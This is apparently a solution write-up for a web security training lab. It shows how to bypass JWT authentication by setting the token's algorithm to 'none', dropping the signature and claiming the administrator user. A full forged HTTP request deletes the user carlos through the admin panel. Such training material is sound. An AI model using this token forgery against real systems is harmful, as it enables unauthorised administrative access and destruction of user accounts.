# Lab: JWT authentication bypass via flawed signature verification

## LAB DESC

```
This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

## SOLUTION

We set `alg` to `none` and strip off the signature payload, while changing the user to `administrator`.  

## REQUEST BODY
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0ab9000a04d38a5680472b2100f00061.web-security-academy.net
Cookie: session=eyJraWQiOiI0OTQxOTY0MS0wMTU5LTQxZTYtYmVlMy1hZWQ2MTViZGMwMTYiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjM1MTA5Miwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0ab9000a04d38a5680472b2100f00061.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

Sending this request returns a 302 Found confirming our attack worked and the user named _Carlos_ was deleted!

> LAB SOLVED
